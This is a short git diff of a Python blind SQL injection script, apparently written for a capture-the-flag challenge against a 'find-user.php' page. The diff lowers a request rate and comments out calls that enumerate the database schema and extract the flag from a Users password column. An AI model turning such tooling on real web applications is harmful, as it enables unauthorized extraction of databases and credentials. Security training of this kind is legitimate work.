@@ -6,7 +6,7 @@ from init import login, domain, flag_pattern
 find_user_url = domain + "find-user.php"
 char_pool = string.ascii_letters + string.punctuation + string.digits
 true = "true"
-rate = 300
+rate = 30
 
 
 def get_num_col():
@@ -104,13 +104,13 @@ def sqli_blind(query_type="DB", db_name=None, table_name=None, col_name=None):
     return res
 
 
-get_num_col()
-sqli_blind()
-sqli_blind("Table", db_name="Secure")
-
-sqli_blind("Column", db_name="Secure", table_name="Trainings")
-sqli_blind("Column", db_name="Secure", table_name="Users")
-sqli_blind("Column", db_name="Secure", table_name="testing")
-
-find_col_has_flag()
-sqli_blind("Flag", db_name="Secure", table_name="Users", col_name="Password")
+# get_num_col()
+# sqli_blind()
+# sqli_blind("Table", db_name="Secure")
+#
+# sqli_blind("Column", db_name="Secure", table_name="Trainings")
+# sqli_blind("Column", db_name="Secure", table_name="Users")
+# sqli_blind("Column", db_name="Secure", table_name="testing")
+#
+# find_col_has_flag()
+# sqli_blind("Flag", db_name="Secure", table_name="Users", col_name="Password")
